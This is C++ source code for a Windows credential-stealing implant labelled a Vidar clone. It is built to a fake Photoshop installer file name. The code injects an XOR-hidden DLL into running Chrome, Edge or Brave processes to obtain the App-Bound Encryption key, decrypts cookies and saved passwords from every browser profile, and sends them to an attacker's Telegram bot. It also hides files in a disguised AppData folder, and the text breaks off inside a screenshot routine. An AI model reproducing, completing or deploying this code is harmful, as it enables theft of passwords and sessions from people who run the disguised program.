// ---------------------------------------------------------------------------
// vidar_clone / single-stage implant + ABE (App-Bound Encryption) dump
// Build:
//   x86_64-w64-mingw32-g++ main.cpp -o Photoshop_2024_Setup.exe \
//     -lwinhttp -lgdiplus -lgdi32 -lshlwapi -lshell32 -lole32 -loleaut32 \
//     -lbcrypt -lcrypt32 -ladvapi32 -mwindows -static
// ---------------------------------------------------------------------------
#include <windows.h>
#include <winhttp.h>
#include <string>
#include <vector>
#include <shlobj.h>
#include <gdiplus.h>
#include <shellapi.h>
#include <tlhelp32.h>
#include <wincrypt.h>
#include <bcrypt.h>
#include <cstring>
#include <cstdlib>
#include <cwchar>
#include <cwctype>
#include <algorithm>

#include "abe/abe_util.h"
#include "abe/abe_payload_blob.h"

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "crypt32.lib")
using namespace Gdiplus;

// ---------------------------------------------------------------------------
// Config
// ---------------------------------------------------------------------------
static const std::wstring TG_TOKEN   = L"YOUR_BOT_TOKEN";
static const std::wstring TG_CHAT_ID = L"YOUR_CHAT_ID";
static const std::wstring TG_HOST    = L"api.telegram.org";

// Append-only debug log: %TEMP%\abe_debug.txt
static void DebugLog(const std::string& msg) {
    std::wstring path = TempPath(L"abe_debug.txt");
    HANDLE h = CreateFileW(path.c_str(), FILE_APPEND_DATA,
                           FILE_SHARE_READ | FILE_SHARE_WRITE,
                           NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return;
    SYSTEMTIME st;
    GetLocalTime(&st);
    char prefix[64];
    wsprintfA(prefix, "[%02d:%02d:%02d] ", st.wHour, st.wMinute, st.wSecond);
    std::string line = prefix + msg + "\r\n";
    DWORD written = 0;
    WriteFile(h, line.data(), (DWORD)line.size(), &written, NULL);
    CloseHandle(h);
}

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------
static std::string UrlEncode(const std::string& in) {
    static const char* hex = "0123456789ABCDEF";
    std::string out;
    out.reserve(in.size() * 3);
    for (unsigned char c : in) {
        if ((c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') ||
            (c >= '0' && c <= '9') || c == '-' || c == '_' || c == '.' || c == '~') {
            out += (char)c;
        } else {
            out += '%';
            out += hex[c >> 4];
            out += hex[c & 0x0F];
        }
    }
    return out;
}

// Reads a file even while a browser keeps it open (SQLite WAL / shared locks).
static bool ReadFileBytes(const std::wstring& path, std::vector<char>& out) {
    HANDLE h = CreateFileW(path.c_str(), GENERIC_READ,
                           FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                           NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return false;

    LARGE_INTEGER sz{};
    if (!GetFileSizeEx(h, &sz) || sz.QuadPart <= 0 || sz.QuadPart > (45LL * 1024 * 1024)) {
        CloseHandle(h);
        return false;
    }
    out.resize((size_t)sz.QuadPart);
    DWORD read = 0;
    BOOL ok = ReadFile(h, out.data(), (DWORD)out.size(), &read, NULL);
    CloseHandle(h);
    if (!ok) return false;
    out.resize(read);
    return read > 0;
}

static HINTERNET OpenRequest(const std::wstring& verb, const std::wstring& object,
                             HINTERNET& hSession, HINTERNET& hConnect) {
    hSession = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                           WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                           WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return NULL;

    DWORD proto = WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_2;
    WinHttpSetOption(hSession, WINHTTP_OPTION_SECURE_PROTOCOLS, &proto, sizeof(proto));
    WinHttpSetTimeouts(hSession, 10000, 10000, 10000, 20000);

    hConnect = WinHttpConnect(hSession, TG_HOST.c_str(), INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) return NULL;

    return WinHttpOpenRequest(hConnect, verb.c_str(), object.c_str(), NULL,
                              WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
                              WINHTTP_FLAG_SECURE);
}

static void CloseAll(HINTERNET hRequest, HINTERNET hConnect, HINTERNET hSession) {
    if (hRequest) WinHttpCloseHandle(hRequest);
    if (hConnect) WinHttpCloseHandle(hConnect);
    if (hSession) WinHttpCloseHandle(hSession);
}

// ---------------------------------------------------------------------------
// Telegram exfil (retry + server response check)
// ---------------------------------------------------------------------------
static int HttpStatus(HINTERNET hRequest) {
    DWORD status = 0, len = sizeof(status);
    if (!WinHttpQueryHeaders(hRequest,
            WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
            WINHTTP_HEADER_NAME_BY_INDEX, &status, &len, WINHTTP_NO_HEADER_INDEX))
        return -1;
    return (int)status;
}

static std::string ReadResponseBody(HINTERNET hRequest) {
    std::string out;
    DWORD avail = 0;
    while (WinHttpQueryDataAvailable(hRequest, &avail) && avail > 0) {
        std::vector<char> buf(avail);
        DWORD read = 0;
        if (!WinHttpReadData(hRequest, buf.data(), avail, &read) || read == 0) break;
        out.append(buf.data(), read);
        if (out.size() > 32768) break;
    }
    return out;
}

static bool SendTextToTelegram(const std::wstring& text) {
    std::string enc = UrlEncode(W2U8(text));
    std::wstring object = L"/bot" + TG_TOKEN + L"/sendMessage?chat_id=" + TG_CHAT_ID +
                          L"&text=" + std::wstring(enc.begin(), enc.end());

    for (int attempt = 1; attempt <= 3; ++attempt) {
        HINTERNET hSession = NULL, hConnect = NULL;
        HINTERNET hRequest = OpenRequest(L"GET", object, hSession, hConnect);
        bool ok = false;
        int status = -1;
        std::string resp;

        if (hRequest) {
            ok = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, NULL, 0, 0, 0) != FALSE;
            if (ok) ok = WinHttpReceiveResponse(hRequest, NULL) != FALSE;
            if (ok) {
                status = HttpStatus(hRequest);
                resp = ReadResponseBody(hRequest);
                ok = (status == 200 && resp.find("\"ok\":true") != std::string::npos);
            }
        }

        DebugLog("tg text attempt=" + std::to_string(attempt) +
                 " status=" + std::to_string(status) +
                 " ok=" + (ok ? "1" : "0") +
                 " resp=" + resp.substr(0, 180));

        CloseAll(hRequest, hConnect, hSession);
        if (ok) return true;
        Sleep(800 * attempt);
    }
    return false;
}

// Send an in-memory buffer as a document. No temp file, no Content-Length dup.
static bool SendBytesToTelegram(const std::vector<char>& data, const std::wstring& fileName) {
    for (int attempt = 1; attempt <= 3; ++attempt) {
        HINTERNET hSession = NULL, hConnect = NULL;
        HINTERNET hRequest = OpenRequest(L"POST", L"/bot" + TG_TOKEN + L"/sendDocument",
                                         hSession, hConnect);
        bool ok = false;
        int status = -1;
        std::string resp;

        if (hRequest) {
            const std::string boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW";
            std::string body;
            body.reserve(data.size() + 512);
            body += "--" + boundary + "\r\n";
            body += "Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n";
            body += W2U8(TG_CHAT_ID) + "\r\n";
            body += "--" + boundary + "\r\n";
            body += "Content-Disposition: form-data; name=\"document\"; filename=\"" +
                    W2U8(fileName) + "\"\r\n";
            body += "Content-Type: application/octet-stream\r\n\r\n";
            body.append(data.data(), data.size());
            body += "\r\n--" + boundary + "--\r\n";

            std::wstring ctype = L"Content-Type: multipart/form-data; boundary=" +
                                 std::wstring(boundary.begin(), boundary.end());
            WinHttpAddRequestHeaders(hRequest, ctype.c_str(), (DWORD)-1,
                                     WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE);

            ok = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                                    (LPVOID)body.data(), (DWORD)body.size(),
                                    (DWORD)body.size(), 0) != FALSE;
            if (ok) ok = WinHttpReceiveResponse(hRequest, NULL) != FALSE;
            if (ok) {
                status = HttpStatus(hRequest);
                resp = ReadResponseBody(hRequest);
                ok = (status == 200 && resp.find("\"ok\":true") != std::string::npos);
            }
        }

        DebugLog("tg file " + W2U8(fileName) + " attempt=" + std::to_string(attempt) +
                 " status=" + std::to_string(status) +
                 " ok=" + (ok ? "1" : "0") +
                 " resp=" + resp.substr(0, 180));

        CloseAll(hRequest, hConnect, hSession);
        if (ok) return true;
        Sleep(800 * attempt);
    }
    return false;
}

static bool SendBytesToTelegram(const std::vector<BYTE>& data, const std::wstring& fileName) {
    std::vector<char> c(data.begin(), data.end());
    return SendBytesToTelegram(c, fileName);
}

// ===========================================================================
// ABE (App-Bound Encryption) module
// ===========================================================================
struct sqlite3;
struct sqlite3_stmt;

struct Sqlite {
    HMODULE mod = NULL;
    int (*open_v2)(const char*, sqlite3**, int, const char*) = NULL;
    int (*prepare_v2)(sqlite3*, const char*, int, sqlite3_stmt**, const char**) = NULL;
    int (*step)(sqlite3_stmt*) = NULL;
    const unsigned char* (*column_text)(sqlite3_stmt*, int) = NULL;
    const void* (*column_blob)(sqlite3_stmt*, int) = NULL;
    int (*column_bytes)(sqlite3_stmt*, int) = NULL;
    int (*finalize)(sqlite3_stmt*) = NULL;
    int (*close)(sqlite3*) = NULL;

    bool Load() {
        mod = LoadLibraryW(L"winsqlite3.dll");
        if (!mod) return false;
        open_v2      = (decltype(open_v2))GetProcAddress(mod, "sqlite3_open_v2");
        prepare_v2   = (decltype(prepare_v2))GetProcAddress(mod, "sqlite3_prepare_v2");
        step         = (decltype(step))GetProcAddress(mod, "sqlite3_step");
        column_text  = (decltype(column_text))GetProcAddress(mod, "sqlite3_column_text");
        column_blob  = (decltype(column_blob))GetProcAddress(mod, "sqlite3_column_blob");
        column_bytes = (decltype(column_bytes))GetProcAddress(mod, "sqlite3_column_bytes");
        finalize     = (decltype(finalize))GetProcAddress(mod, "sqlite3_finalize");
        close        = (decltype(close))GetProcAddress(mod, "sqlite3_close");
        return open_v2 && prepare_v2 && step && column_text && column_blob &&
               column_bytes && finalize && close;
    }
};

static const int SQLITE_OK_ = 0;
static const int SQLITE_ROW_ = 100;
static const int SQLITE_OPEN_READONLY_ = 0x00000001;

static std::vector<BYTE> DpapiUnprotect(const std::vector<BYTE>& in) {
    DATA_BLOB din{(DWORD)in.size(), (BYTE*)in.data()}, dout{};
    if (!CryptUnprotectData(&din, NULL, NULL, NULL, NULL, 0, &dout)) return {};
    std::vector<BYTE> out(dout.pbData, dout.pbData + dout.cbData);
    LocalFree(dout.pbData);
    return out;
}

static std::vector<BYTE> Sha256(const std::string& s) {
    std::vector<BYTE> out;
    BCRYPT_ALG_HANDLE alg = NULL;
    if (BCryptOpenAlgorithmProvider(&alg, BCRYPT_SHA256_ALGORITHM, NULL, 0) != 0) return out;
    BCRYPT_HASH_HANDLE hash = NULL;
    if (BCryptCreateHash(alg, &hash, NULL, 0, NULL, 0, 0) == 0) {
        BCryptHashData(hash, (PUCHAR)s.data(), (ULONG)s.size(), 0);
        out.resize(32);
        if (BCryptFinishHash(hash, out.data(), 32, 0) != 0) out.clear();
        BCryptDestroyHash(hash);
    }
    BCryptCloseAlgorithmProvider(alg, 0);
    return out;
}

// blob = [v10|v20][12-byte nonce][ciphertext][16-byte tag]
static bool AesGcmDecrypt(const std::vector<BYTE>& key, const BYTE* blob, size_t len,
                          std::vector<BYTE>& out) {
    if (key.size() != 32 || len < 3 + 12 + 16) return false;
    const BYTE* nonce = blob + 3;
    const BYTE* ct    = blob + 3 + 12;
    size_t ctLen      = len - 3 - 12 - 16;
    const BYTE* tag   = blob + len - 16;

    BCRYPT_ALG_HANDLE alg = NULL;
    if (BCryptOpenAlgorithmProvider(&alg, BCRYPT_AES_ALGORITHM, NULL, 0) != 0) return false;
    BCryptSetProperty(alg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_GCM,
                      sizeof(BCRYPT_CHAIN_MODE_GCM), 0);

    BCRYPT_KEY_HANDLE hKey = NULL;
    bool ok = false;
    if (BCryptGenerateSymmetricKey(alg, &hKey, NULL, 0, (PUCHAR)key.data(),
                                   (ULONG)key.size(), 0) == 0) {
        BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO info;
        BCRYPT_INIT_AUTH_MODE_INFO(info);
        info.pbNonce = (PUCHAR)nonce;
        info.cbNonce = 12;
        info.pbTag   = (PUCHAR)tag;
        info.cbTag   = 16;

        out.resize(ctLen);
        ULONG done = 0;
        if (BCryptDecrypt(hKey, (PUCHAR)ct, (ULONG)ctLen, &info, NULL, 0,
                          out.data(), (ULONG)out.size(), &done, 0) == 0) {
            out.resize(done);
            ok = true;
        }
        BCryptDestroyKey(hKey);
    }
    BCryptCloseAlgorithmProvider(alg, 0);
    return ok;
}

static std::string StripDomainHash(const std::vector<BYTE>& pt, const std::string& host) {
    if (pt.size() >= 32) {
        std::vector<BYTE> h = Sha256(host);
        if (h.size() == 32 && memcmp(pt.data(), h.data(), 32) == 0)
            return std::string((const char*)pt.data() + 32, pt.size() - 32);
    }
    return std::string((const char*)pt.data(), pt.size());
}

static bool CopyShared(const std::wstring& src, const std::wstring& dst) {
    std::vector<BYTE> b;
    if (!ReadFileAll(src, b)) return false;
    return WriteFileAll(dst, b.data(), b.size());
}

static std::wstring CopyDbForRead(const std::wstring& src, const std::wstring& tag) {
    std::wstring dst = TempPath(tag);
    if (!CopyShared(src, dst)) return L"";
    CopyShared(src + L"-wal", dst + L"-wal");
    CopyShared(src + L"-shm", dst + L"-shm");
    return dst;
}

static std::wstring LocalStatePath(const std::wstring& exeLower) {
    wchar_t appData[MAX_PATH] = {0};
    if (FAILED(SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, appData))) return L"";
    if (exeLower == L"msedge.exe")
        return std::wstring(appData) + L"\\Microsoft\\Edge\\User Data\\Local State";
    if (exeLower == L"brave.exe")
        return std::wstring(appData) + L"\\BraveSoftware\\Brave-Browser\\User Data\\Local State";
    return std::wstring(appData) + L"\\Google\\Chrome\\User Data\\Local State";
}

static std::vector<BYTE> GetLegacyKey(const std::wstring& localState) {
    std::string json;
    if (!ReadFileText(localState, json)) return {};
    std::string b64;
    if (!ExtractJsonString(json, "encrypted_key", b64)) return {};
    std::vector<BYTE> blob = Base64Decode(b64);
    if (blob.size() > 5 && memcmp(blob.data(), "DPAPI", 5) == 0)
        blob.erase(blob.begin(), blob.begin() + 5);
    return DpapiUnprotect(blob);
}

// ---------------------------------------------------------------------------
// Process discovery / injection
// ---------------------------------------------------------------------------
typedef LONG (NTAPI *pfnNtQueryInformationProcess)(HANDLE, ULONG, PVOID, ULONG, PULONG);

struct MY_UNICODE_STRING { USHORT Length; USHORT MaximumLength; PWSTR Buffer; };
struct MY_PEB { BYTE Reserved1[0x20]; PVOID ProcessParameters; };
struct MY_RTL_USER_PROCESS_PARAMETERS { BYTE Reserved1[0x70]; MY_UNICODE_STRING CommandLine; };
struct MY_PROCESS_BASIC_INFORMATION {
    PVOID Reserved1; PVOID PebBaseAddress; PVOID Reserved2[2];
    ULONG_PTR UniqueProcessId; PVOID Reserved3;
};

static std::wstring GetProcessCommandLine(HANDLE hProc) {
    static pfnNtQueryInformationProcess ntQuery =
        (pfnNtQueryInformationProcess)GetProcAddress(GetModuleHandleW(L"ntdll.dll"),
                                                     "NtQueryInformationProcess");
    if (!ntQuery) return L"";

    MY_PROCESS_BASIC_INFORMATION pbi{};
    if (ntQuery(hProc, 0, &pbi, sizeof(pbi), NULL) != 0 || !pbi.PebBaseAddress)
        return L"";

    MY_PEB peb{};
    if (!ReadProcessMemory(hProc, pbi.PebBaseAddress, &peb, sizeof(peb), NULL) ||
        !peb.ProcessParameters)
        return L"";

    MY_RTL_USER_PROCESS_PARAMETERS params{};
    if (!ReadProcessMemory(hProc, peb.ProcessParameters, &params, sizeof(params), NULL) ||
        params.CommandLine.Length == 0 || params.CommandLine.Length > 0x8000 ||
        !params.CommandLine.Buffer)
        return L"";

    std::wstring cmd(params.CommandLine.Length / sizeof(wchar_t), L'\0');
    if (!ReadProcessMemory(hProc, params.CommandLine.Buffer, &cmd[0],
                           params.CommandLine.Length, NULL))
        return L"";
    return cmd;
}

static DWORD FindBrowserPid(const std::wstring& wantExe) {
    DWORD lowest = 0, lowestNoType = 0;
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32W pe{};
    pe.dwSize = sizeof(pe);
    for (BOOL ok = Process32FirstW(snap, &pe); ok; ok = Process32NextW(snap, &pe)) {
        std::wstring exe = pe.szExeFile;
        for (auto& c : exe) c = towlower(c);
        if (exe != L"chrome.exe" && exe != L"msedge.exe" && exe != L"brave.exe")
            continue;
        if (!wantExe.empty() && exe != wantExe)
            continue;

        if (!lowest || pe.th32ProcessID < lowest) lowest = pe.th32ProcessID;

        HANDLE h = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE,
                               pe.th32ProcessID);
        if (h) {
            std::wstring cmd = GetProcessCommandLine(h);
            CloseHandle(h);
            if (!cmd.empty() && cmd.find(L"--type=") == std::wstring::npos) {
                if (!lowestNoType || pe.th32ProcessID < lowestNoType)
                    lowestNoType = pe.th32ProcessID;
            }
        }
    }
    CloseHandle(snap);
    return lowestNoType ? lowestNoType : lowest;
}

static void EnableDebugPrivilege() {
    HANDLE token = NULL;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token))
        return;
    TOKEN_PRIVILEGES tp{};
    tp.PrivilegeCount = 1;
    LookupPrivilegeValueW(NULL, L"SeDebugPrivilege", &tp.Privileges[0].Luid);
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    AdjustTokenPrivileges(token, FALSE, &tp, sizeof(tp), NULL, NULL);
    CloseHandle(token);
}

static bool InjectDll(DWORD pid, const std::wstring& dllPath) {
    HANDLE h = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
                           PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
                           FALSE, pid);
    if (!h) return false;

    SIZE_T bytes = (dllPath.size() + 1) * sizeof(wchar_t);
    LPVOID remote = VirtualAllocEx(h, NULL, bytes, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remote) { CloseHandle(h); return false; }

    bool ok = WriteProcessMemory(h, remote, dllPath.c_str(), bytes, NULL) != FALSE;
    if (ok) {
        HMODULE k32 = GetModuleHandleW(L"kernel32.dll");
        FARPROC loadLib = GetProcAddress(k32, "LoadLibraryW");
        HANDLE th = CreateRemoteThread(h, NULL, 0, (LPTHREAD_START_ROUTINE)loadLib,
                                       remote, 0, NULL);
        if (th) {
            WaitForSingleObject(th, 10000);
            CloseHandle(th);
        } else {
            ok = false;
        }
    }
    VirtualFreeEx(h, remote, 0, MEM_RELEASE);
    CloseHandle(h);
    return ok;
}

// ---------------------------------------------------------------------------
// Dumpers
// ---------------------------------------------------------------------------
static bool DumpCookies(const std::wstring& dbPath, const std::vector<BYTE>& abeKey,
                        const std::vector<BYTE>& legacyKey, std::string& out) {
    std::wstring copy = CopyDbForRead(dbPath, L"abe_cookies.db");
    if (copy.empty()) return false;

    Sqlite sql;
    if (!sql.Load()) { DeleteFileW(copy.c_str()); return false; }

    sqlite3* db = NULL;
    if (sql.open_v2(W2U8(copy).c_str(), &db, SQLITE_OPEN_READONLY_, NULL) != SQLITE_OK_ || !db) {
        DeleteFileW(copy.c_str());
        return false;
    }

    sqlite3_stmt* st = NULL;
    if (sql.prepare_v2(db, "SELECT host_key,name,encrypted_value FROM cookies",
                       -1, &st, NULL) == SQLITE_OK_ && st) {
        while (sql.step(st) == SQLITE_ROW_) {
            const char* host = (const char*)sql.column_text(st, 0);
            const char* name = (const char*)sql.column_text(st, 1);
            const void* blob = sql.column_blob(st, 2);
            int n = sql.column_bytes(st, 2);
            if (!host || !name || !blob || n < 3) continue;

            std::vector<BYTE> enc((const BYTE*)blob, (const BYTE*)blob + n);
            std::vector<BYTE> pt;
            bool ok = false;

            if (memcmp(enc.data(), "v20", 3) == 0 && !abeKey.empty())
                ok = AesGcmDecrypt(abeKey, enc.data(), enc.size(), pt);
            else if (memcmp(enc.data(), "v10", 3) == 0 && !legacyKey.empty())
                ok = AesGcmDecrypt(legacyKey, enc.data(), enc.size(), pt);

            if (!ok) continue;
            std::string value = StripDomainHash(pt, host);
            out += "{\"host\":\"" + JsonEscape(host) +
                   "\",\"name\":\"" + JsonEscape(name) +
                   "\",\"value\":\"" + JsonEscape(value) + "\"}\n";
        }
        sql.finalize(st);
    }
    sql.close(db);
    DeleteFileW(copy.c_str());
    DeleteFileW((copy + L"-wal").c_str());
    DeleteFileW((copy + L"-shm").c_str());
    return !out.empty();
}

static bool DumpPasswords(const std::wstring& dbPath, const std::vector<BYTE>& abeKey,
                          const std::vector<BYTE>& legacyKey, std::string& out) {
    std::wstring copy = CopyDbForRead(dbPath, L"abe_logins.db");
    if (copy.empty()) return false;

    Sqlite sql;
    if (!sql.Load()) { DeleteFileW(copy.c_str()); return false; }

    sqlite3* db = NULL;
    if (sql.open_v2(W2U8(copy).c_str(), &db, SQLITE_OPEN_READONLY_, NULL) != SQLITE_OK_ || !db) {
        DeleteFileW(copy.c_str());
        return false;
    }

    sqlite3_stmt* st = NULL;
    if (sql.prepare_v2(db, "SELECT origin_url,username_value,password_value FROM logins",
                       -1, &st, NULL) == SQLITE_OK_ && st) {
        while (sql.step(st) == SQLITE_ROW_) {
            const char* url  = (const char*)sql.column_text(st, 0);
            const char* user = (const char*)sql.column_text(st, 1);
            const void* blob = sql.column_blob(st, 2);
            int n = sql.column_bytes(st, 2);
            if (!url || !user || !blob || n < 3) continue;

            std::vector<BYTE> enc((const BYTE*)blob, (const BYTE*)blob + n);
            std::vector<BYTE> pt;
            bool ok = false;

            if (memcmp(enc.data(), "v20", 3) == 0 && !abeKey.empty())
                ok = AesGcmDecrypt(abeKey, enc.data(), enc.size(), pt);
            else if (memcmp(enc.data(), "v10", 3) == 0 && !legacyKey.empty())
                ok = AesGcmDecrypt(legacyKey, enc.data(), enc.size(), pt);

            if (!ok) continue;
            std::string pass((const char*)pt.data(), pt.size());
            out += "{\"url\":\"" + JsonEscape(url) +
                   "\",\"user\":\"" + JsonEscape(user) +
                   "\",\"pass\":\"" + JsonEscape(pass) + "\"}\n";
        }
        sql.finalize(st);
    }
    sql.close(db);
    DeleteFileW(copy.c_str());
    DeleteFileW((copy + L"-wal").c_str());
    DeleteFileW((copy + L"-shm").c_str());
    return !out.empty();
}

// ---------------------------------------------------------------------------
// ABE run: write embedded DLL, inject, decrypt, exfil
// ---------------------------------------------------------------------------
static bool LaunchBrowser() {
    const wchar_t* paths[] = {
        L"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
        L"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe",
        L"C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe",
        L"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe"
    };
    for (auto p : paths) {
        if (GetFileAttributesW(p) != INVALID_FILE_ATTRIBUTES) {
            ShellExecuteW(NULL, L"open", p, NULL, NULL, SW_SHOWNORMAL);
            return true;
        }
    }
    return false;
}

static bool RunAbeDump() {
    DebugLog("abe: start");
    EnableDebugPrivilege();

    // Decrypt the XOR-encrypted embedded payload (no raw PE in the exe).
    std::vector<BYTE> dllBytes(abe_payload_data, abe_payload_data + abe_payload_data_len);
    const BYTE xorKey[] = {0xA7, 0x3C, 0x91, 0x5E};
    for (size_t i = 0; i < dllBytes.size(); ++i)
        dllBytes[i] ^= xorKey[i % sizeof(xorKey)];

    // Write it next to the hidden copy (folder added to AV exclusions).
    wchar_t roaming[MAX_PATH] = {0};
    SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, roaming);
    std::wstring hiddenDir = std::wstring(roaming) + L"\\Microsoft\\InputPersonalization";
    CreateDirectoryW(hiddenDir.c_str(), NULL);
    std::wstring dllPath = hiddenDir + L"\\abe_" +
                           std::to_wstring(GetCurrentProcessId()) + L".dll";
    if (!WriteFileAll(dllPath, dllBytes.data(), dllBytes.size())) {
        DebugLog("abe: dll write failed");
        SendTextToTelegram(L"ABE: ghi payload DLL thất bại.");
        return false;
    }
    DebugLog("abe: dll written");

    // Auto: Chrome -> Edge -> Brave.
    DWORD pid = 0;
    const wchar_t* order[] = {L"chrome.exe", L"msedge.exe", L"brave.exe"};
    for (auto e : order) {
        pid = FindBrowserPid(e);
        if (pid) break;
    }
    if (!pid) {
        DebugLog("abe: no browser, launching");
        if (LaunchBrowser()) {
            Sleep(4000);
            for (auto e : order) { pid = FindBrowserPid(e); if (pid) break; }
        }
    }
    if (!pid) {
        DebugLog("abe: no browser process");
        SendTextToTelegram(L"ABE: không thấy browser đang chạy.");
        return false;
    }
    DebugLog("abe: pid=" + std::to_string(pid));

    // Derive browser identity from the target image.
    std::wstring exeLower = L"chrome.exe";
    {
        HANDLE hp = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
        if (hp) {
            wchar_t img[MAX_PATH] = {0};
            DWORD sz = MAX_PATH;
            if (QueryFullProcessImageNameW(hp, 0, img, &sz)) {
                std::wstring f = img;
                size_t slash = f.find_last_of(L"\\/");
                exeLower = (slash == std::wstring::npos) ? f : f.substr(slash + 1);
                for (auto& c : exeLower) c = towlower(c);
            }
            CloseHandle(hp);
        }
    }

    std::wstring keyPath = TempPath(L"abe_key.bin");
    std::wstring errPath = TempPath(L"abe_key_err.txt");
    DeleteFileW(keyPath.c_str());
    DeleteFileW(errPath.c_str());

    if (!InjectDll(pid, dllPath)) {
        DebugLog("abe: inject failed");
        SendTextToTelegram(L"ABE: inject thất bại (OpenProcess/CreateRemoteThread).");
        return false;
    }
    DebugLog("abe: injected");

    std::vector<BYTE> abeKey;
    for (int i = 0; i < 300; ++i) { // 30s
        if (GetFileAttributesW(keyPath.c_str()) != INVALID_FILE_ATTRIBUTES) {
            ReadFileAll(keyPath, abeKey);
            break;
        }
        if (GetFileAttributesW(errPath.c_str()) != INVALID_FILE_ATTRIBUTES) {
            std::string e;
            ReadFileText(errPath, e);
            SendTextToTelegram(L"ABE payload: " + U82W(e));
            return false;
        }
        Sleep(100);
    }
    if (abeKey.size() != 32) {
        DebugLog("abe: key timeout/err");
        SendTextToTelegram(L"ABE: không lấy được key (timeout).");
        return false;
    }
    DebugLog("abe: key ok");

    std::wstring localState = LocalStatePath(exeLower);
    std::vector<BYTE> legacyKey = GetLegacyKey(localState);

    wchar_t appData[MAX_PATH] = {0};
    SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, appData);
    std::wstring userData;
    if (exeLower == L"msedge.exe")      userData = std::wstring(appData) + L"\\Microsoft\\Edge\\User Data";
    else if (exeLower == L"brave.exe")  userData = std::wstring(appData) + L"\\BraveSoftware\\Brave-Browser\\User Data";
    else                                userData = std::wstring(appData) + L"\\Google\\Chrome\\User Data";

    // Default + all "Profile *" profiles.
    std::vector<std::wstring> profiles;
    profiles.push_back(userData + L"\\Default");
    WIN32_FIND_DATAW fd{};
    HANDLE hFind = FindFirstFileW((userData + L"\\Profile *").c_str(), &fd);
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            if ((fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) &&
                wcscmp(fd.cFileName, L".") != 0 && wcscmp(fd.cFileName, L"..") != 0)
                profiles.push_back(userData + L"\\" + fd.cFileName);
        } while (FindNextFileW(hFind, &fd));
        FindClose(hFind);
    }

    std::string cookies, logins;
    for (const auto& prof : profiles) {
        DumpCookies(prof + L"\\Network\\Cookies", abeKey, legacyKey, cookies);
        DumpPasswords(prof + L"\\Login Data", abeKey, legacyKey, logins);
    }
    DebugLog("abe: profiles=" + std::to_string(profiles.size()) +
             " cookies=" + std::to_string(std::count(cookies.begin(), cookies.end(), '\n')) +
             " logins=" + std::to_string(std::count(logins.begin(), logins.end(), '\n')));

    int total = 0;
    if (!cookies.empty()) {
        total += (int)std::count(cookies.begin(), cookies.end(), '\n');
        std::vector<BYTE> b(cookies.begin(), cookies.end());
        SendBytesToTelegram(b, L"abe_cookies.json");
    }
    if (!logins.empty()) {
        total += (int)std::count(logins.begin(), logins.end(), '\n');
        std::vector<BYTE> b(logins.begin(), logins.end());
        SendBytesToTelegram(b, L"abe_passwords.json");
    }

    SendTextToTelegram(L"ABE dump xong: " + std::to_wstring(total) +
                       L" mục. Key OK. (" + exeLower + L")");

    DeleteFileW(keyPath.c_str());
    DeleteFileW(errPath.c_str());
    return true;
}

// ---------------------------------------------------------------------------
// Screenshot
// ---------------------------------------------------------------------------
static int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
    UINT num = 0, size = 0;
    if (GetImageEncodersSize(&num, &size) != Ok || size == 0) return -1;

    ImageCodecInfo* info = (ImageCodecInfo*)malloc(size);
    if (!info) return -1;
    GetImageEncoders(num, size, info);

    int found = -1;
    for (UINT i = 0; i < num; ++i) {
        if (wcscmp(info[i].MimeType, format) == 0) {
            *pClsid = info[i].Clsid;
            found = (int)i;
            break;
        }
    }
    free(info);
    return found;
}

static void TakeScreenshot() {
    GdiplusStartupInput input;
    ULONG_PTR token = 0;
    if (GdiplusStartup(&token, &input, NULL) != Ok) return;

    int x = GetSystemMetrics(SM_XVIRTUALSCREEN);
    int y = GetSystemMetrics(SM_YVIRTUALSCREEN);
    int w = GetSystemMetrics(SM_CXVIRTUALSCREEN);
    int h = GetSystemMetrics(SM_CYVIRTUALSCREEN);
